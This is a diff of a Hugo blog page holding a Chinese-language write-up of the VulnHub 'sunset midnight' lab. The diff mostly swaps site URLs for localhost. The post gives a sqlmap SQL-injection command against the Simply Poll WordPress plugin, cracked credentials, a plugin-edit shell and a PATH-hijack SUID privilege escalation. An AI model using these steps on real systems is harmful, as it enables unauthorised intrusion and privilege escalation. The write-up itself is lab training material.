@@ -1,4 +1,4 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0x036 sunset midnight | 养猪日记</title>
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>0x036 sunset midnight | 养猪日记</title>
 <meta name=keywords content><meta name=description content='开机改网卡
 端口扫描
 
@@ -55,126 +55,14 @@ ssh连接失败：
 
 再次修改密码：
 
-'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0x036 sunset midnight "><meta property="og:description" content='开机改网卡
-端口扫描
-
-
-
-
-
-
-渗透测试
-修改hosts
-
-
-又是一个wordpress：
-
-
-wpscan扫描一下：
-用户名admin
-
-
-插件：
---enumerate
-
-
-通过查询Simply Poll的历史漏洞发现sql注入：
-
-
-
-
-sqlmap -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&amp;pollid=2" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump
-
-
-虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：
-找了半天hash生成工具，找到这个网站了
-https://www.useotools.com/wordpress-password-hash-generator/output
-
-
-但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表
-
-
-
-
-
-
-破解
-root/robert
-
-
-ssh连接失败：
-
-
-还有一个端口3306：
-连接成功：
-
-
-再次修改密码：
-
-'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0x036 sunset midnight "><meta name=twitter:description content='开机改网卡
-端口扫描
-
-
-
-
-
-
-渗透测试
-修改hosts
-
-
-又是一个wordpress：
-
-
-wpscan扫描一下：
-用户名admin
-
-
-插件：
---enumerate
-
-
-通过查询Simply Poll的历史漏洞发现sql注入：
-
-
-
-
-sqlmap -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&amp;pollid=2" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump
-
-
-虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：
-找了半天hash生成工具，找到这个网站了
-https://www.useotools.com/wordpress-password-hash-generator/output
-
-
-但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表
-
-
-
-
-
-
-破解
-root/robert
-
-
-ssh连接失败：
-
-
-还有一个端口3306：
-连接成功：
-
-
-再次修改密码：
-
-'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0x036 sunset midnight ","item":"https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0x036 sunset midnight ","name":"0x036 sunset midnight ","description":"开机改网卡\n端口扫描 渗透测试 修改hosts\n又是一个wordpress：\nwpscan扫描一下：\n用户名admin\n插件：\n--enumerate 通过查询Simply Poll的历史漏洞发现sql注入：\nsqlmap -u \u0026#34;http://sunset-midnight/wp-admin/admin-ajax.php\u0026#34; --data=\u0026#34;action=spAjaxResults\u0026amp;pollid=2\u0026#34; --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump 虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：\n找了半天hash生成工具，找到这个网站了\nhttps://www.useotools.com/wordpress-password-hash-generator/output\n但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表\n破解\nroot/robert\nssh连接失败：\n还有一个端口3306：\n连接成功：\n再次修改密码：\n","keywords":[],"articleBody":"开机改网卡\n端口扫描 渗透测试 修改hosts\n又是一个wordpress：\nwpscan扫描一下：\n用户名admin\n插件：\n--enumerate 通过查询Simply Poll的历史漏洞发现sql注入：\nsqlmap -u \"http://sunset-midnight/wp-admin/admin-ajax.php\" --data=\"action=spAjaxResults\u0026pollid=2\" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump 虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：\n找了半天hash生成工具，找到这个网站了\nhttps://www.useotools.com/wordpress-password-hash-generator/output\n但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表\n破解\nroot/robert\nssh连接失败：\n还有一个端口3306：\n连接成功：\n再次修改密码：\n进入wordpress后台：\n这次是修改插件getshell:\n提权 麻了，看样子还是得破解那个hash:\n这边先跑着，然后翻一下敏感文件：\n好使：\n/** MySQL database username */\ndefine( ‘DB_USER’, ‘jose’ );\n/** MySQL database password */\ndefine( ‘DB_PASSWORD’, ‘645dc5a8871d2a4269d4cbe23f6ae103’ );\nuser.txt:\nSUID提权\n修改环境变量：\necho \"/bin/bash\" \u003e service\rchmod 777 service\rexport PATH=/tmp:$PATH\rstatus 这里有几个疑问：这里的SUID是非常规的命令，GTFOBins并不能给出好的提权建议，看很多WP都是一笔带过，就说这个可疑，那么这个可疑的判断是只能看经验吗，还是有什么技巧，还是只能挨个看。\n这个问题随着对靶场和系统的熟悉会得到解决，前期靠挨个看，后期凭经验。\n然后是这个命令，我倒是知道是service ssh status的结果，但是这里又怎么看出来脚本没有使用service命令的绝对路径，导致可以修改环境变量来提权。\n针对这个疑问，可以使用strings命令读取status的可识别字符串，就可以解答了。\n","wordCount":"80","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x036 sunset midnight</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;80 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><p>开机改网卡</p><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE515c39a3dcd4fcc5ce0480c323d5ffdd%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEe25f0457757bbefae5bfd634c289321b%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEb2710c79e4f6c9659dfad6e683bf179f%e6%88%aa%e5%9b%be.png alt></p><h1 id=渗透测试>渗透测试<a hidden class=anchor aria-hidden=true href=#渗透测试>#</a></h1><p>修改hosts</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9416f3c413dc69ca81bb6da38cb50b53%e6%88%aa%e5%9b%be.png alt></p><p>又是一个wordpress：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc745f8202c3dbe9ee7c7247705308f13%e6%88%aa%e5%9b%be.png alt></p><p>wpscan扫描一下：</p><p>用户名admin</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9510f37f7c02bcd4a296d91df829154f%e6%88%aa%e5%9b%be.png alt></p><p>插件：</p><pre tabindex=0><code>--enumerate
+'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/vulnhub/0x036-sunset-midnight-/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/vulnhub/0x036-sunset-midnight-/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x036 sunset midnight</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;80 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><p>开机改网卡</p><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE515c39a3dcd4fcc5ce0480c323d5ffdd%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEe25f0457757bbefae5bfd634c289321b%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEb2710c79e4f6c9659dfad6e683bf179f%e6%88%aa%e5%9b%be.png alt></p><h1 id=渗透测试>渗透测试<a hidden class=anchor aria-hidden=true href=#渗透测试>#</a></h1><p>修改hosts</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9416f3c413dc69ca81bb6da38cb50b53%e6%88%aa%e5%9b%be.png alt></p><p>又是一个wordpress：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc745f8202c3dbe9ee7c7247705308f13%e6%88%aa%e5%9b%be.png alt></p><p>wpscan扫描一下：</p><p>用户名admin</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9510f37f7c02bcd4a296d91df829154f%e6%88%aa%e5%9b%be.png alt></p><p>插件：</p><pre tabindex=0><code>--enumerate
 </code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc7dca05db1ab1a43e4703a6874d66850%e6%88%aa%e5%9b%be.png alt></p><p>通过查询Simply Poll的历史漏洞发现sql注入：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE51825315e324319d8346b1b8c18c9a0d%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE848c7a2d74488032fec7fb2914a8da18%e6%88%aa%e5%9b%be.png alt></p><pre tabindex=0><code>sqlmap -u &#34;http://sunset-midnight/wp-admin/admin-ajax.php&#34; --data=&#34;action=spAjaxResults&amp;pollid=2&#34; --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump
 </code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEcee05cc4df5bc1ee05e20f953efe1863%e6%88%aa%e5%9b%be.png alt></p><p>虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：</p><p>找了半天hash生成工具，找到这个网站了</p><p><a href=https://www.useotools.com/wordpress-password-hash-generator/output>https://www.useotools.com/wordpress-password-hash-generator/output</a></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEcf45a329b9b9f084054046b680c0d714%e6%88%aa%e5%9b%be.png alt></p><p>但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEe9741833b28b831db0975a086e66aae7%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEac1df8d7902946381479d04729d86e47%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2ac5d6bd7c5cd8d5c0df79e71a4d4e55%e6%88%aa%e5%9b%be.png alt></p><p>破解</p><p>root/robert</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE0f0829e50053a3c8368b33e58540f079%e6%88%aa%e5%9b%be.png alt></p><p>ssh连接失败：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE67d04ecc7aec34c3c8998e5aba5369c5%e6%88%aa%e5%9b%be.png alt></p><p>还有一个端口3306：</p><p>连接成功：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE687afab837885aabd4de5814df67218c%e6%88%aa%e5%9b%be.png alt></p><p>再次修改密码：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE0bec078c9a9cba3a798281ce70fdcf68%e6%88%aa%e5%9b%be.png alt></p><p>进入wordpress后台：</p><p>这次是修改插件getshell:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8e7ff13a609e5e71068f534ba1231521%e6%88%aa%e5%9b%be.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>麻了，看样子还是得破解那个hash:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEb6d959bb755f9fba5f5e17b69179532c%e6%88%aa%e5%9b%be.png alt></p><p>这边先跑着，然后翻一下敏感文件：</p><p>好使：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8833e487d9dd9350b33fb02fc3c7d101%e6%88%aa%e5%9b%be.png alt></p><p>/** MySQL database username */</p><p>define( &lsquo;DB_USER&rsquo;, &lsquo;jose&rsquo; );</p><p>/** MySQL database password */</p><p>define( &lsquo;DB_PASSWORD&rsquo;, &lsquo;645dc5a8871d2a4269d4cbe23f6ae103&rsquo; );</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE699630602e0acdcee30a258e744f1447%e6%88%aa%e5%9b%be.png alt></p><p>user.txt:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE10e43248bd11cf8477e0d5a992620f0e%e6%88%aa%e5%9b%be.png alt></p><p>SUID提权</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8e4a97fb6834d0df4aa5c824b83e2e82%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc99209e1d543e9319c86f013294305b2%e6%88%aa%e5%9b%be.png alt></p><p>修改环境变量：</p><pre tabindex=0><code>echo &#34;/bin/bash&#34; &gt; service
 chmod 777 service
 export PATH=/tmp:$PATH
 status
-</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEff132dd6bb6f9d63f06022b4b38c678d%e6%88%aa%e5%9b%be.png alt></p><p>这里有几个疑问：这里的SUID是非常规的命令，GTFOBins并不能给出好的提权建议，看很多WP都是一笔带过，就说这个可疑，那么这个可疑的判断是只能看经验吗，还是有什么技巧，还是只能挨个看。</p><p>这个问题随着对靶场和系统的熟悉会得到解决，前期靠挨个看，后期凭经验。</p><p>然后是这个命令，我倒是知道是service ssh status的结果，但是这里又怎么看出来脚本没有使用service命令的绝对路径，导致可以修改环境变量来提权。</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4054cd8cd544ac1be8d0a863d2daa467%e6%88%aa%e5%9b%be.png alt></p><p>针对这个疑问，可以使用strings命令读取status的可识别字符串，就可以解答了。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/><span class=title>« Prev</span><br><span>0X036 BreadCrumbs</span>
-</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x037-sunset-twilight/><span class=title>Next »</span><br><span>0x037 Sunset Twilight</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEff132dd6bb6f9d63f06022b4b38c678d%e6%88%aa%e5%9b%be.png alt></p><p>这里有几个疑问：这里的SUID是非常规的命令，GTFOBins并不能给出好的提权建议，看很多WP都是一笔带过，就说这个可疑，那么这个可疑的判断是只能看经验吗，还是有什么技巧，还是只能挨个看。</p><p>这个问题随着对靶场和系统的熟悉会得到解决，前期靠挨个看，后期凭经验。</p><p>然后是这个命令，我倒是知道是service ssh status的结果，但是这里又怎么看出来脚本没有使用service命令的绝对路径，导致可以修改环境变量来提权。</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4054cd8cd544ac1be8d0a863d2daa467%e6%88%aa%e5%9b%be.png alt></p><p>针对这个疑问，可以使用strings命令读取status的可识别字符串，就可以解答了。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/htb/0x036-breadcrumbs/><span class=title>« Prev</span><br><span>0X036 BreadCrumbs</span>
+</a><a class=next href=http://localhost:1313/posts/vulnhub/0x037-sunset-twilight/><span class=title>Next »</span><br><span>0x037 Sunset Twilight</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
 <span>Powered by
 <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
         <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
